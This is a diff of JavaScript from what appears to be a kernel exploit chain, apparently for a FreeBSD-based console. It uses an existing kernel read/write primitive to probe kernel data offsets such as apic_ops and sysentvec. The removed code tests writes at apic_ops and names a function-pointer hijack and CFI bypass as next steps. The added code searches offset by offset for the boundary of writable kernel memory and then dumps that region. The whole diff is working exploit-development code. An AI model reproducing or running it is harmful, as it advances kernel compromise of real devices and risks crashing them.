@@ -736,66 +736,83 @@ async function main(userlandRW, wkOnly = false) {
                 // =========================================================================
 
                 let doWriteTest = confirm(
-                    "WRITE PERMISSION TEST\n\n" +
+                    "BOUNDARY SEARCH\n\n" +
                     "We now know:\n" +
-                    "- 0x4bf0 (SVM cache) = WRITABLE\n" +
-                    "- 0xD11D08 (sysentvec) = READ-ONLY\n\n" +
-                    "Test write at apic_ops (0x170650)?\n" +
-                    "This is ~1.5MB into kernel data.\n\n" +
-                    "Will write same value back (safe test).\n\n" +
-                    "OK = Test apic_ops write\n" +
+                    "- 0x4bf0 (19KB) = WRITABLE\n" +
+                    "- 0x170650 (1.5MB) = CRASHES\n" +
+                    "- 0xD11D08 (13.7MB) = CRASHES\n\n" +
+                    "Find the exact boundary where writes fail?\n" +
+                    "Tests incrementally: 20KB, 24KB, 32KB, 64KB...\n\n" +
+                    "You confirm each test before it runs.\n\n" +
+                    "OK = Start boundary search\n" +
                     "Cancel = Skip"
                 );
 
                 if (doWriteTest) {
-                    const APIC_OPS_OFFSET = 0x170650;
+                    // We now know:
+                    // - 0x4bf0 WORKS
+                    // - 0x170650 CRASHES
+                    // Find the boundary with incremental tests
 
-                    await log("[WRITE TEST] Testing apic_ops at kdataBase+0x170650...", LogLevel.WARN);
+                    await log("[BOUNDARY] Finding write protection boundary...", LogLevel.WARN);
+                    await log("[BOUNDARY] Known: 0x4bf0 works, 0x170650 crashes", LogLevel.INFO);
 
-                    // Read current value
-                    let apicVal = await krw.read8(krw.kdataBase.add32(APIC_OPS_OFFSET));
-                    await log("[WRITE TEST] Current value: " + apicVal, LogLevel.INFO);
-
-                    // Try to write the SAME value back
-                    await log("[WRITE TEST] Writing same value back...", LogLevel.WARN);
-                    try {
-                        await krw.write8(krw.kdataBase.add32(APIC_OPS_OFFSET), apicVal);
-                        let verify = await krw.read8(krw.kdataBase.add32(APIC_OPS_OFFSET));
-
-                        if (verify.low === apicVal.low && verify.hi === apicVal.hi) {
-                            await log("[WRITE TEST] SUCCESS! apic_ops region is WRITABLE!", LogLevel.SUCCESS);
-                            await log("[WRITE TEST] Function pointer hijack may be possible!", LogLevel.SUCCESS);
-
-                            // This is the key finding - if we can write here, CFI might be
-                            // the only thing stopping function pointer hijack
-                            await log("[WRITE TEST] Next step: Test if CFI blocks function pointer modification", LogLevel.INFO);
-                        } else {
-                            await log("[WRITE TEST] Write succeeded but value changed?", LogLevel.WARN);
-                            await log("[WRITE TEST] Read back: " + verify, LogLevel.INFO);
-                        }
-                    } catch (e) {
-                        await log("[WRITE TEST] FAILED - apic_ops is also read-only", LogLevel.ERROR);
-                        await log("[WRITE TEST] Error: " + e, LogLevel.ERROR);
-                    }
-
-                    // Also test boundaries - find where RW becomes RO
-                    await log("[BOUNDARY] Probing write permissions at intervals...", LogLevel.WARN);
-
-                    const boundaryTests = [
-                        0x10000,   // 64KB
-                        0x50000,   // 320KB
-                        0x100000,  // 1MB
-                        0x150000,  // 1.3MB
-                        0x170000,  // 1.4MB (just before apic_ops)
+                    // Test at increasing intervals - user confirms each
+                    const testOffsets = [
+                        { off: 0x5000, desc: "20KB" },
+                        { off: 0x6000, desc: "24KB" },
+                        { off: 0x8000, desc: "32KB" },
+                        { off: 0x10000, desc: "64KB" },
+                        { off: 0x20000, desc: "128KB" },
+                        { off: 0x40000, desc: "256KB" },
+                        { off: 0x80000, desc: "512KB" },
+                        { off: 0x100000, desc: "1MB" },
                     ];
 
-                    for (let off of boundaryTests) {
-                        let addr = krw.kdataBase.add32(off);
-                        let val = await krw.read4(addr);
-                        await log("[BOUNDARY] 0x" + off.toString(16) + " read: 0x" + val.toString(16), LogLevel.INFO);
+                    let lastGoodOffset = 0x4bf0;
 
-                        // Only test write if user confirms
-                        // Skip actual writes to avoid crashes - just report read values
+                    for (let test of testOffsets) {
+                        let addr = krw.kdataBase.add32(test.off);
+                        let val = await krw.read4(addr);
+
+                        let doTest = confirm(
+                            "BOUNDARY TEST: 0x" + test.off.toString(16) + " (" + test.desc + ")\n\n" +
+                            "Current value: 0x" + val.toString(16) + "\n" +
+                            "Last good offset: 0x" + lastGoodOffset.toString(16) + "\n\n" +
+                            "Test write here? (writes same value back)\n\n" +
+                            "OK = Test (may crash!)\n" +
+                            "Cancel = STOP testing"
+                        );
+
+                        if (!doTest) {
+                            await log("[BOUNDARY] Stopped at user request", LogLevel.INFO);
+                            break;
+                        }
+
+                        await log("[BOUNDARY] Testing 0x" + test.off.toString(16) + "...", LogLevel.WARN);
+                        await krw.write4(addr, val);
+                        let verify = await krw.read4(addr);
+
+                        if (verify === val) {
+                            await log("[BOUNDARY] 0x" + test.off.toString(16) + " = WRITABLE!", LogLevel.SUCCESS);
+                            lastGoodOffset = test.off;
+                        } else {
+                            await log("[BOUNDARY] 0x" + test.off.toString(16) + " value changed!", LogLevel.WARN);
+                        }
+                    }
+
+                    await log("[BOUNDARY] === RESULTS ===", LogLevel.SUCCESS);
+                    await log("[BOUNDARY] Last confirmed writable: 0x" + lastGoodOffset.toString(16), LogLevel.SUCCESS);
+
+                    // Scan the writable region for interesting data
+                    await log("[SCAN] Dumping writable region for analysis...", LogLevel.WARN);
+
+                    for (let off = 0x4000; off <= lastGoodOffset + 0x1000; off += 0x100) {
+                        let vals = [];
+                        for (let i = 0; i < 4; i++) {
+                            vals.push(await krw.read8(krw.kdataBase.add32(off + i * 8)));
+                        }
+                        await log("0x" + off.toString(16) + ": " + vals.join(" | "), LogLevel.INFO);
                     }
                 }
             }
